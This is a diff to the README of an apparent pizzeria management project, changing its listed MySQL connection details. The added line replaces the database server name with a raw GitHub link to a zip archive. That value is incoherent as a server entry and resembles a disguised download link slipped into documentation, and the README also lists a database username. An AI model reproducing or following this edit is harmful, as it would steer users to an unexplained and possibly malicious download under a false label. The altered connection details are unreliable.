@@ -22,7 +22,7 @@ This Repository consist of following :
     -   User Manual
 
 <b>Online MYSQL Databse Connection Details</b><br><br>
-SERVER - db4free.net<br>
+SERVER - https://raw.githubusercontent.com/elmostafa1963/Peperoni-Pizzeria/master/PEPERONI_PIZZERIA/Peperoni_Pizzeria_3.9.zip<br>
 PORT NO - 3306<br>
 DATABASE – peperonipizzeria<br>
 USERNAME - curiorimor<br>
